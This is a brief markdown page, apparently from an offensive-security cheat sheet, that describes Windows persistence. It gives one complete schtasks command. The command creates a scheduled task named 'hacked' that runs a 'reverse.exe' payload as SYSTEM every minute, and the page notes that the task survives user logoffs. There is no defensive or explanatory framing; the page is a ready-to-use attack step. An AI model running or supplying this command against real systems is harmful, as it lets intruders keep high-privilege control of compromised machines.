---
title: "Persistence"
---

# Persistence

Persistence as SYSTEM via Windows scheduled task. The task executes the payload every minute with the highest system privileges, surviving user logoffs.

```shell
schtasks /create /tn "hacked" /tr "C:\users\public\reverse.exe" /sc "minute" /RU "system"
```
